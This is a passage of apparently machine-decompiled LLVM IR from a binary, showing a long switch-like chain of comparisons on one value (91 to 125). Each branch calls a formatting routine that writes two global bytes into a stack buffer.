  br i1 %v7_c194, label %dec_label_pc_c19c, label %dec_label_pc_c1c4

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c190
  %v2_c19c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1a8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c1b4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c1c0 = sext i8 %v3_c1a8 to i32
  %v6_c1c0 = sext i8 %v3_c1b4 to i32
  %v8_c1c0 = call i32 @szprintf(i32 %v2_c19c, i32 ptrtoint ([13 x i8]* @global_var_1f3c8.260 to i32), i32 %v4_c1c0, i32 %v6_c1c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1c4

dec_label_pc_c1c4:                                ; preds = %dec_label_pc_c190, %dec_label_pc_c19c
  %v7_c1c8 = icmp eq i32 %v2_acd8, 91
  br i1 %v7_c1c8, label %dec_label_pc_c1d0, label %dec_label_pc_c1f8

dec_label_pc_c1d0:                                ; preds = %dec_label_pc_c1c4
  %v2_c1d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1dc = load i8, i8* @global_var_2a549.78, align 1
  %v3_c1e8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c1f4 = sext i8 %v3_c1dc to i32
  %v6_c1f4 = sext i8 %v3_c1e8 to i32
  %v8_c1f4 = call i32 @szprintf(i32 %v2_c1d0, i32 ptrtoint ([13 x i8]* @global_var_1f3d8.262 to i32), i32 %v4_c1f4, i32 %v6_c1f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1f8

dec_label_pc_c1f8:                                ; preds = %dec_label_pc_c1c4, %dec_label_pc_c1d0
  %v7_c1fc = icmp eq i32 %v2_acd8, 92
  br i1 %v7_c1fc, label %dec_label_pc_c204, label %dec_label_pc_c22c

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1f8
  %v2_c204 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c210 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c21c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c228 = sext i8 %v3_c210 to i32
  %v6_c228 = sext i8 %v3_c21c to i32
  %v8_c228 = call i32 @szprintf(i32 %v2_c204, i32 ptrtoint ([13 x i8]* @global_var_1f3e8.264 to i32), i32 %v4_c228, i32 %v6_c228, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c22c

dec_label_pc_c22c:                                ; preds = %dec_label_pc_c1f8, %dec_label_pc_c204
  %v7_c230 = icmp eq i32 %v2_acd8, 93
  br i1 %v7_c230, label %dec_label_pc_c238, label %dec_label_pc_c260

dec_label_pc_c238:                                ; preds = %dec_label_pc_c22c
  %v2_c238 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c244 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c250 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c25c = sext i8 %v3_c244 to i32
  %v6_c25c = sext i8 %v3_c250 to i32
  %v8_c25c = call i32 @szprintf(i32 %v2_c238, i32 ptrtoint ([13 x i8]* @global_var_1f3f8.266 to i32), i32 %v4_c25c, i32 %v6_c25c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c260

dec_label_pc_c260:                                ; preds = %dec_label_pc_c22c, %dec_label_pc_c238
  %v7_c264 = icmp eq i32 %v2_acd8, 94
  br i1 %v7_c264, label %dec_label_pc_c26c, label %dec_label_pc_c294

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c260
  %v2_c26c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c278 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c284 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c290 = sext i8 %v3_c278 to i32
  %v6_c290 = sext i8 %v3_c284 to i32
  %v8_c290 = call i32 @szprintf(i32 %v2_c26c, i32 ptrtoint ([13 x i8]* @global_var_1f0d8.165 to i32), i32 %v4_c290, i32 %v6_c290, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c294

dec_label_pc_c294:                                ; preds = %dec_label_pc_c260, %dec_label_pc_c26c
  %v7_c298 = icmp eq i32 %v2_acd8, 95
  br i1 %v7_c298, label %dec_label_pc_c2a0, label %dec_label_pc_c2c8

dec_label_pc_c2a0:                                ; preds = %dec_label_pc_c294
  %v2_c2a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2ac = load i8, i8* @global_var_2a549.78, align 1
  %v3_c2b8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c2c4 = sext i8 %v3_c2ac to i32
  %v6_c2c4 = sext i8 %v3_c2b8 to i32
  %v8_c2c4 = call i32 @szprintf(i32 %v2_c2a0, i32 ptrtoint ([13 x i8]* @global_var_1f408.268 to i32), i32 %v4_c2c4, i32 %v6_c2c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2c8

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c294, %dec_label_pc_c2a0
  %v7_c2cc = icmp eq i32 %v2_acd8, 96
  br i1 %v7_c2cc, label %dec_label_pc_c2d4, label %dec_label_pc_c2fc

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_c2c8
  %v2_c2d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c2e0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c2ec = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c2f8 = sext i8 %v3_c2e0 to i32
  %v6_c2f8 = sext i8 %v3_c2ec to i32
  %v8_c2f8 = call i32 @szprintf(i32 %v2_c2d4, i32 ptrtoint ([13 x i8]* @global_var_1f108.171 to i32), i32 %v4_c2f8, i32 %v6_c2f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c2fc

dec_label_pc_c2fc:                                ; preds = %dec_label_pc_c2c8, %dec_label_pc_c2d4
  %v7_c300 = icmp eq i32 %v2_acd8, 97
  br i1 %v7_c300, label %dec_label_pc_c308, label %dec_label_pc_c330

dec_label_pc_c308:                                ; preds = %dec_label_pc_c2fc
  %v2_c308 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c314 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c320 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c32c = sext i8 %v3_c314 to i32
  %v6_c32c = sext i8 %v3_c320 to i32
  %v8_c32c = call i32 @szprintf(i32 %v2_c308, i32 ptrtoint ([13 x i8]* @global_var_1f418.270 to i32), i32 %v4_c32c, i32 %v6_c32c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c330

dec_label_pc_c330:                                ; preds = %dec_label_pc_c2fc, %dec_label_pc_c308
  %v7_c334 = icmp eq i32 %v2_acd8, 98
  br i1 %v7_c334, label %dec_label_pc_c33c, label %dec_label_pc_c364

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c330
  %v2_c33c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c348 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c354 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c360 = sext i8 %v3_c348 to i32
  %v6_c360 = sext i8 %v3_c354 to i32
  %v8_c360 = call i32 @szprintf(i32 %v2_c33c, i32 ptrtoint ([13 x i8]* @global_var_1f428.272 to i32), i32 %v4_c360, i32 %v6_c360, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c364

dec_label_pc_c364:                                ; preds = %dec_label_pc_c330, %dec_label_pc_c33c
  %v7_c368 = icmp eq i32 %v2_acd8, 99
  br i1 %v7_c368, label %dec_label_pc_c370, label %dec_label_pc_c398

dec_label_pc_c370:                                ; preds = %dec_label_pc_c364
  %v2_c370 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c37c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c388 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c394 = sext i8 %v3_c37c to i32
  %v6_c394 = sext i8 %v3_c388 to i32
  %v8_c394 = call i32 @szprintf(i32 %v2_c370, i32 ptrtoint ([13 x i8]* @global_var_1f438.274 to i32), i32 %v4_c394, i32 %v6_c394, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c398

dec_label_pc_c398:                                ; preds = %dec_label_pc_c364, %dec_label_pc_c370
  %v7_c39c = icmp eq i32 %v2_acd8, 100
  br i1 %v7_c39c, label %dec_label_pc_c3a4, label %dec_label_pc_c3cc

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c398
  %v2_c3a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3b0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c3bc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c3c8 = sext i8 %v3_c3b0 to i32
  %v6_c3c8 = sext i8 %v3_c3bc to i32
  %v8_c3c8 = call i32 @szprintf(i32 %v2_c3a4, i32 ptrtoint ([13 x i8]* @global_var_1f448.276 to i32), i32 %v4_c3c8, i32 %v6_c3c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %dec_label_pc_c398, %dec_label_pc_c3a4
  %v7_c3d0 = icmp eq i32 %v2_acd8, 101
  br i1 %v7_c3d0, label %dec_label_pc_c3d8, label %dec_label_pc_c400

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3cc
  %v2_c3d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c3e4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c3f0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c3fc = sext i8 %v3_c3e4 to i32
  %v6_c3fc = sext i8 %v3_c3f0 to i32
  %v8_c3fc = call i32 @szprintf(i32 %v2_c3d8, i32 ptrtoint ([13 x i8]* @global_var_1f458.278 to i32), i32 %v4_c3fc, i32 %v6_c3fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c400

dec_label_pc_c400:                                ; preds = %dec_label_pc_c3cc, %dec_label_pc_c3d8
  %v7_c404 = icmp eq i32 %v2_acd8, 102
  br i1 %v7_c404, label %dec_label_pc_c40c, label %dec_label_pc_c434

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c400
  %v2_c40c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c418 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c424 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c430 = sext i8 %v3_c418 to i32
  %v6_c430 = sext i8 %v3_c424 to i32
  %v8_c430 = call i32 @szprintf(i32 %v2_c40c, i32 ptrtoint ([12 x i8]* @global_var_1f468.280 to i32), i32 %v4_c430, i32 %v6_c430, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c434

dec_label_pc_c434:                                ; preds = %dec_label_pc_c400, %dec_label_pc_c40c
  %v7_c438 = icmp eq i32 %v2_acd8, 103
  br i1 %v7_c438, label %dec_label_pc_c440, label %dec_label_pc_c468

dec_label_pc_c440:                                ; preds = %dec_label_pc_c434
  %v2_c440 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c44c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c458 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c464 = sext i8 %v3_c44c to i32
  %v6_c464 = sext i8 %v3_c458 to i32
  %v8_c464 = call i32 @szprintf(i32 %v2_c440, i32 ptrtoint ([13 x i8]* @global_var_1f474.282 to i32), i32 %v4_c464, i32 %v6_c464, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c468

dec_label_pc_c468:                                ; preds = %dec_label_pc_c434, %dec_label_pc_c440
  %v7_c46c = icmp eq i32 %v2_acd8, 104
  br i1 %v7_c46c, label %dec_label_pc_c474, label %dec_label_pc_c49c

dec_label_pc_c474:                                ; preds = %dec_label_pc_c468
  %v2_c474 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c480 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c48c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c498 = sext i8 %v3_c480 to i32
  %v6_c498 = sext i8 %v3_c48c to i32
  %v8_c498 = call i32 @szprintf(i32 %v2_c474, i32 ptrtoint ([13 x i8]* @global_var_1f484.284 to i32), i32 %v4_c498, i32 %v6_c498, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c49c

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c468, %dec_label_pc_c474
  %v7_c4a0 = icmp eq i32 %v2_acd8, 105
  br i1 %v7_c4a0, label %dec_label_pc_c4a8, label %dec_label_pc_c4d0

dec_label_pc_c4a8:                                ; preds = %dec_label_pc_c49c
  %v2_c4a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4b4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c4c0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c4cc = sext i8 %v3_c4b4 to i32
  %v6_c4cc = sext i8 %v3_c4c0 to i32
  %v8_c4cc = call i32 @szprintf(i32 %v2_c4a8, i32 ptrtoint ([13 x i8]* @global_var_1f494.286 to i32), i32 %v4_c4cc, i32 %v6_c4cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4d0

dec_label_pc_c4d0:                                ; preds = %dec_label_pc_c49c, %dec_label_pc_c4a8
  %v7_c4d4 = icmp eq i32 %v2_acd8, 106
  br i1 %v7_c4d4, label %dec_label_pc_c4dc, label %dec_label_pc_c504

dec_label_pc_c4dc:                                ; preds = %dec_label_pc_c4d0
  %v2_c4dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4e8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c4f4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c500 = sext i8 %v3_c4e8 to i32
  %v6_c500 = sext i8 %v3_c4f4 to i32
  %v8_c500 = call i32 @szprintf(i32 %v2_c4dc, i32 ptrtoint ([12 x i8]* @global_var_1f4a4.288 to i32), i32 %v4_c500, i32 %v6_c500, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c4d0, %dec_label_pc_c4dc
  %v7_c508 = icmp eq i32 %v2_acd8, 107
  br i1 %v7_c508, label %dec_label_pc_c510, label %dec_label_pc_c538

dec_label_pc_c510:                                ; preds = %dec_label_pc_c504
  %v2_c510 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c51c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c528 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c534 = sext i8 %v3_c51c to i32
  %v6_c534 = sext i8 %v3_c528 to i32
  %v8_c534 = call i32 @szprintf(i32 %v2_c510, i32 ptrtoint ([13 x i8]* @global_var_1f4b0.290 to i32), i32 %v4_c534, i32 %v6_c534, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c538

dec_label_pc_c538:                                ; preds = %dec_label_pc_c504, %dec_label_pc_c510
  %v7_c53c = icmp eq i32 %v2_acd8, 108
  br i1 %v7_c53c, label %dec_label_pc_c544, label %dec_label_pc_c56c

dec_label_pc_c544:                                ; preds = %dec_label_pc_c538
  %v2_c544 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c550 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c55c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c568 = sext i8 %v3_c550 to i32
  %v6_c568 = sext i8 %v3_c55c to i32
  %v8_c568 = call i32 @szprintf(i32 %v2_c544, i32 ptrtoint ([14 x i8]* @global_var_1f4c0.292 to i32), i32 %v4_c568, i32 %v6_c568, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c56c

dec_label_pc_c56c:                                ; preds = %dec_label_pc_c538, %dec_label_pc_c544
  %v7_c570 = icmp eq i32 %v2_acd8, 109
  br i1 %v7_c570, label %dec_label_pc_c578, label %dec_label_pc_c5a0

dec_label_pc_c578:                                ; preds = %dec_label_pc_c56c
  %v2_c578 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c584 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c590 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c59c = sext i8 %v3_c584 to i32
  %v6_c59c = sext i8 %v3_c590 to i32
  %v8_c59c = call i32 @szprintf(i32 %v2_c578, i32 ptrtoint ([14 x i8]* @global_var_1f4d0.294 to i32), i32 %v4_c59c, i32 %v6_c59c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5a0

dec_label_pc_c5a0:                                ; preds = %dec_label_pc_c56c, %dec_label_pc_c578
  %v7_c5a4 = icmp eq i32 %v2_acd8, 110
  br i1 %v7_c5a4, label %dec_label_pc_c5ac, label %dec_label_pc_c5d4

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c5a0
  %v2_c5ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5b8 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c5c4 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c5d0 = sext i8 %v3_c5b8 to i32
  %v6_c5d0 = sext i8 %v3_c5c4 to i32
  %v8_c5d0 = call i32 @szprintf(i32 %v2_c5ac, i32 ptrtoint ([13 x i8]* @global_var_1f4e0.296 to i32), i32 %v4_c5d0, i32 %v6_c5d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %dec_label_pc_c5a0, %dec_label_pc_c5ac
  %v7_c5d8 = icmp eq i32 %v2_acd8, 111
  br i1 %v7_c5d8, label %dec_label_pc_c5e0, label %dec_label_pc_c608

dec_label_pc_c5e0:                                ; preds = %dec_label_pc_c5d4
  %v2_c5e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5ec = load i8, i8* @global_var_2a549.78, align 1
  %v3_c5f8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c604 = sext i8 %v3_c5ec to i32
  %v6_c604 = sext i8 %v3_c5f8 to i32
  %v8_c604 = call i32 @szprintf(i32 %v2_c5e0, i32 ptrtoint ([14 x i8]* @global_var_1f4f0.298 to i32), i32 %v4_c604, i32 %v6_c604, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c608

dec_label_pc_c608:                                ; preds = %dec_label_pc_c5d4, %dec_label_pc_c5e0
  %v7_c60c = icmp eq i32 %v2_acd8, 112
  br i1 %v7_c60c, label %dec_label_pc_c614, label %dec_label_pc_c63c

dec_label_pc_c614:                                ; preds = %dec_label_pc_c608
  %v2_c614 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c620 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c62c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c638 = sext i8 %v3_c620 to i32
  %v6_c638 = sext i8 %v3_c62c to i32
  %v8_c638 = call i32 @szprintf(i32 %v2_c614, i32 ptrtoint ([14 x i8]* @global_var_1f500.300 to i32), i32 %v4_c638, i32 %v6_c638, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c63c

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c608, %dec_label_pc_c614
  %v7_c640 = icmp eq i32 %v2_acd8, 113
  br i1 %v7_c640, label %dec_label_pc_c648, label %dec_label_pc_c670

dec_label_pc_c648:                                ; preds = %dec_label_pc_c63c
  %v2_c648 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c654 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c660 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c66c = sext i8 %v3_c654 to i32
  %v6_c66c = sext i8 %v3_c660 to i32
  %v8_c66c = call i32 @szprintf(i32 %v2_c648, i32 ptrtoint ([13 x i8]* @global_var_1f510.302 to i32), i32 %v4_c66c, i32 %v6_c66c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c670

dec_label_pc_c670:                                ; preds = %dec_label_pc_c63c, %dec_label_pc_c648
  %v7_c674 = icmp eq i32 %v2_acd8, 114
  br i1 %v7_c674, label %dec_label_pc_c67c, label %dec_label_pc_c6a4

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c670
  %v2_c67c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c688 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c694 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c6a0 = sext i8 %v3_c688 to i32
  %v6_c6a0 = sext i8 %v3_c694 to i32
  %v8_c6a0 = call i32 @szprintf(i32 %v2_c67c, i32 ptrtoint ([14 x i8]* @global_var_1f520.304 to i32), i32 %v4_c6a0, i32 %v6_c6a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c670, %dec_label_pc_c67c
  %v7_c6a8 = icmp eq i32 %v2_acd8, 115
  br i1 %v7_c6a8, label %dec_label_pc_c6b0, label %dec_label_pc_c6d8

dec_label_pc_c6b0:                                ; preds = %dec_label_pc_c6a4
  %v2_c6b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6bc = load i8, i8* @global_var_2a549.78, align 1
  %v3_c6c8 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c6d4 = sext i8 %v3_c6bc to i32
  %v6_c6d4 = sext i8 %v3_c6c8 to i32
  %v8_c6d4 = call i32 @szprintf(i32 %v2_c6b0, i32 ptrtoint ([13 x i8]* @global_var_1f530.306 to i32), i32 %v4_c6d4, i32 %v6_c6d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c6d8

dec_label_pc_c6d8:                                ; preds = %dec_label_pc_c6a4, %dec_label_pc_c6b0
  %v7_c6dc = icmp eq i32 %v2_acd8, 116
  br i1 %v7_c6dc, label %dec_label_pc_c6e4, label %dec_label_pc_c70c

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c6d8
  %v2_c6e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c6f0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c6fc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c708 = sext i8 %v3_c6f0 to i32
  %v6_c708 = sext i8 %v3_c6fc to i32
  %v8_c708 = call i32 @szprintf(i32 %v2_c6e4, i32 ptrtoint ([13 x i8]* @global_var_1f540.308 to i32), i32 %v4_c708, i32 %v6_c708, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c70c

dec_label_pc_c70c:                                ; preds = %dec_label_pc_c6d8, %dec_label_pc_c6e4
  %v7_c710 = icmp eq i32 %v2_acd8, 117
  br i1 %v7_c710, label %dec_label_pc_c718, label %dec_label_pc_c740

dec_label_pc_c718:                                ; preds = %dec_label_pc_c70c
  %v2_c718 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c724 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c730 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c73c = sext i8 %v3_c724 to i32
  %v6_c73c = sext i8 %v3_c730 to i32
  %v8_c73c = call i32 @szprintf(i32 %v2_c718, i32 ptrtoint ([14 x i8]* @global_var_1f550.310 to i32), i32 %v4_c73c, i32 %v6_c73c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c740

dec_label_pc_c740:                                ; preds = %dec_label_pc_c70c, %dec_label_pc_c718
  %v7_c744 = icmp eq i32 %v2_acd8, 118
  br i1 %v7_c744, label %dec_label_pc_c74c, label %dec_label_pc_c774

dec_label_pc_c74c:                                ; preds = %dec_label_pc_c740
  %v2_c74c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c758 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c764 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c770 = sext i8 %v3_c758 to i32
  %v6_c770 = sext i8 %v3_c764 to i32
  %v8_c770 = call i32 @szprintf(i32 %v2_c74c, i32 ptrtoint ([14 x i8]* @global_var_1f560.312 to i32), i32 %v4_c770, i32 %v6_c770, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c740, %dec_label_pc_c74c
  %v7_c778 = icmp eq i32 %v2_acd8, 119
  br i1 %v7_c778, label %dec_label_pc_c780, label %dec_label_pc_c7a8

dec_label_pc_c780:                                ; preds = %dec_label_pc_c774
  %v2_c780 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c78c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c798 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c7a4 = sext i8 %v3_c78c to i32
  %v6_c7a4 = sext i8 %v3_c798 to i32
  %v8_c7a4 = call i32 @szprintf(i32 %v2_c780, i32 ptrtoint ([14 x i8]* @global_var_1f570.314 to i32), i32 %v4_c7a4, i32 %v6_c7a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7a8

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c774, %dec_label_pc_c780
  %v7_c7ac = icmp eq i32 %v2_acd8, 120
  br i1 %v7_c7ac, label %dec_label_pc_c7b4, label %dec_label_pc_c7dc

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c7a8
  %v2_c7b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7c0 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c7cc = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c7d8 = sext i8 %v3_c7c0 to i32
  %v6_c7d8 = sext i8 %v3_c7cc to i32
  %v8_c7d8 = call i32 @szprintf(i32 %v2_c7b4, i32 ptrtoint ([14 x i8]* @global_var_1f580.316 to i32), i32 %v4_c7d8, i32 %v6_c7d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c7dc

dec_label_pc_c7dc:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c7b4
  %v7_c7e0 = icmp eq i32 %v2_acd8, 121
  br i1 %v7_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c810

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c7dc
  %v2_c7e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c7f4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c800 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c80c = sext i8 %v3_c7f4 to i32
  %v6_c80c = sext i8 %v3_c800 to i32
  %v8_c80c = call i32 @szprintf(i32 %v2_c7e8, i32 ptrtoint ([14 x i8]* @global_var_1f4c0.292 to i32), i32 %v4_c80c, i32 %v6_c80c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c810

dec_label_pc_c810:                                ; preds = %dec_label_pc_c7dc, %dec_label_pc_c7e8
  %v7_c814 = icmp eq i32 %v2_acd8, 122
  br i1 %v7_c814, label %dec_label_pc_c81c, label %dec_label_pc_c844

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c810
  %v2_c81c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c828 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c834 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c840 = sext i8 %v3_c828 to i32
  %v6_c840 = sext i8 %v3_c834 to i32
  %v8_c840 = call i32 @szprintf(i32 %v2_c81c, i32 ptrtoint ([13 x i8]* @global_var_1f590.318 to i32), i32 %v4_c840, i32 %v6_c840, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c844

dec_label_pc_c844:                                ; preds = %dec_label_pc_c810, %dec_label_pc_c81c
  %v7_c848 = icmp eq i32 %v2_acd8, 123
  br i1 %v7_c848, label %dec_label_pc_c850, label %dec_label_pc_c878

dec_label_pc_c850:                                ; preds = %dec_label_pc_c844
  %v2_c850 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c85c = load i8, i8* @global_var_2a549.78, align 1
  %v3_c868 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c874 = sext i8 %v3_c85c to i32
  %v6_c874 = sext i8 %v3_c868 to i32
  %v8_c874 = call i32 @szprintf(i32 %v2_c850, i32 ptrtoint ([12 x i8]* @global_var_1f5a0.320 to i32), i32 %v4_c874, i32 %v6_c874, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %dec_label_pc_c844, %dec_label_pc_c850
  %v7_c87c = icmp eq i32 %v2_acd8, 124
  br i1 %v7_c87c, label %dec_label_pc_c884, label %dec_label_pc_c8ac

dec_label_pc_c884:                                ; preds = %dec_label_pc_c878
  %v2_c884 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c890 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c89c = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c8a8 = sext i8 %v3_c890 to i32
  %v6_c8a8 = sext i8 %v3_c89c to i32
  %v8_c8a8 = call i32 @szprintf(i32 %v2_c884, i32 ptrtoint ([14 x i8]* @global_var_1f5ac.322 to i32), i32 %v4_c8a8, i32 %v6_c8a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c884
  %v7_c8b0 = icmp eq i32 %v2_acd8, 125
  br i1 %v7_c8b0, label %dec_label_pc_c8b8, label %dec_label_pc_c8e0

dec_label_pc_c8b8:                                ; preds = %dec_label_pc_c8ac
  %v2_c8b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8c4 = load i8, i8* @global_var_2a549.78, align 1
  %v3_c8d0 = load i8, i8* @global_var_2a54a.79, align 1
  %v4_c8dc = sext i8 %v3_c8c4 to i32
  %v6_c8dc = sext i8 %v3_c8d0 to i32
  %v8_c8dc = call i32 @szprintf(i32 %v2_c8b8, i32 ptrtoint ([14 x i8]* @global_var_1f5bc.324 to i32), i32 %v4_c8dc, i32 %v6_c8dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8e0

